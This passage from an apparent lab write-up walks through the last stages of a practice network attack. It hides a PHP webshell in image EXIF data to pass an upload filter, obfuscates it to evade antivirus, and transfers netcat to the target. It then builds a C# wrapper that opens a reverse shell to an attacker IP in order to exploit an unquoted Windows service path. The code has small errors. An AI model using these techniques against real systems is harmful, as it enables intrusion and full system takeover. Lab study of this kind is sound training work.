Now we can head into the last commit and search for some .php files as it is the webserver's back-end language. Using `find . -name "*.php"` we get only one result. If we are 
going to find a serious vulnerability it is going to have to be here. 
Inside of this file there are notes "ToDo" and we can read about "basic auth" filter that we will try to bypass and we also can get a look at filter itself. It is basic php 
script and we see that only picture files are accepted. In the line 4 we can see that the file will get moved into an `uploads/` directory with it's original name 
assuming it passed the two filters. Now we are ready to exploit this vulnerability.
    
### Exploiting Vulnerability

Using your web browser let's head to the `/resources` directory. As we expected we are met with a request for authentication. Username is either `Thomas` or `twreath` and 
password we already gathered earlier. We are welcomed with the site to upload images of Thomas' cat.

We already know that to bypass the first filter we need to change the extension to `.jpeg.php`. But the second filter is slightly harder because the getimagesize() function 
is checking for attributes that only an image will have. We need to upload a genuine image file which contains a PHP webshell somewhere. If this file has a .php extension 
then it will be executed by the website as a PHP file. 

The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way. Take a random image and then 
check the exifdata of this file using `exiftool` . To add payload to our image we once again use exiftool  :  
`
exiftool -Comment="<PHP-PAYLOAD>" <NAME-OF-THE-FILE>
`

### Bypassing the antivirus	

We now need to figure out how to make a PHP script that will bypass the antivirus software. What we need to do is build a payload that does what we need it to do, then we 
obfuscate it either manually or by using one of the many tools available online.
		
```
		<?php 
			$cmd = $_GET["wreath"];
			if(isset($cmd)){
				echo "<pre>" . shell_exec($cmd) . "</pre>";	
			}
			die();
		?>
```

Now there are a variety of measures we could take here, including but not limited to :
	- Switching parts of the exploit around so that they're in an unusual order
	- Encoding all of the strings so that they're not recognisable
	- Splitting up distinctive parts of the code
For the sake of this experience we'll use online tool called php-obfuscator available at https://www.gaijin.at/en/tools/php-obfuscator . As this is getting passed into a bash 
command we will need to escape the dollar signs `$p0` -> `\$p0` and with that obfuscated payload we can finish off our exploit. This gives us possibility to execute commands 
through this webshell but let's get the full reverse shell.

### Full Reverse Shell

The quick and easy option to do this is to upload a netcat into target machine. Because the versions of netcat for Windows that comes with Kali is known to Defender we are 
going to use one of the versions from github ([this repository](https://github.com/int0x33/nc.exe/) )
		
		---

		#### Cross compilation
		
		It is an essential skill -- although in many ways it's preferable to avoid it. The idea is to compile source code into a working program to run on a different platform. 
		Ideally we should always try to compile our code in an environment as close to the target environment as possible. Sometimes it's easiest to just cross-compile, however.
		Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). 
		```
		sudo apt install mingw-w64
		```
		Inside the directory we cloned we can use a makefile to compile the binary but we do have to make a small change. We need to comment out the first line and add another line 
		underneath : `CC=x86_64-w64-mingw32-gcc` that will tell this file how to compile. With that out of our way we can just `file nc.exe` and we are done.
		
		---
		
Now when you get your binary compiled we need to transfer it. We start up our python server `python3 -m http.server 80` and choose a way to download this binary :
		- Powershell might work but with AMSI in play it's a risk
		- We could use the file upload point but this will be very painful
		- We could look for other command line tools that we could use like `curl.exe` or `certutil.exe`
You can test out the `certutil.exe` command in webshell and see that it de facto is installed on this host.
		
### Enumeration from inside
		
The only thing left is to enumerate this machine and potentially find a vulnerability that will give us full access. We'll start off with a little bit of manual enumeration :
```
whoami /priv
whoami /groups
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
sc qc SystemExplorerHelpService
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
Output of the third command gives us list of all services on the system and filters them so the only services left are not in the C:\Windows directory. There is a bunch of 
results but the one called "SystemExplorerHelpService" is interesting because it lacks quotation marks around it. This indicates that it might be vulnerable to an `Unqoted 
Service Path` attack. With the last command we are looking at "Access:" to see if we are able to write inside this service directory. Because we have full control and this
service is running as the local system account we can easily make our own binary and not mess with the service itself.
		
### Privilege Escalation
		
Because of the fact that we already have netcat binary on target host we will go the easy way and just make a program that will execute this binary and give us the reverse 
shell. We will start with installing Mono as our core compiler for Linux but it's up to you what you will use.
```
sudo apt install mono-devel
nano Wrapper.cs

namespace Wrapper{
	class Program{
		static void Main(){
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe, "10.50.156.24 445 -e cmd.exe");
			procInfo.CreateNoWindows = true;
			proc.StartInfo = procInfo;
			proc.Start();
		}
	}
}
	
msc Wrapper.cs
```
and just like this we have our compiler `Wrapper.exe` that we need to transfer to the target. Easy way is to use usual HTTP server and cURL. 
		
`Unquoted service path vulnerabilities` occur due to aspect of how Windows looks for files. If a path in Windows is not surrounded by quotes it will look for the executable 
in the following order :
		1. C:\Directory.exe
		2. C:\Directory One\Directory.exe
		3. C:\Directory One\Directory Two\Directory.exe
We need to put this file in the place that we have write permissions in. Because of that we will use Direcotry \System Explorer\ and call our file `System.exe`. 
		
As this service starts automatically at boot we can try to stop the service and wait as it restarts itself `sc stop SystemExplorerHelpService`. After a while we will get that 
root access and have access to the whole network.
		
Thank you for reading, it took long time to write it all down and learn myself. Have a nice day!
		
		
		
		
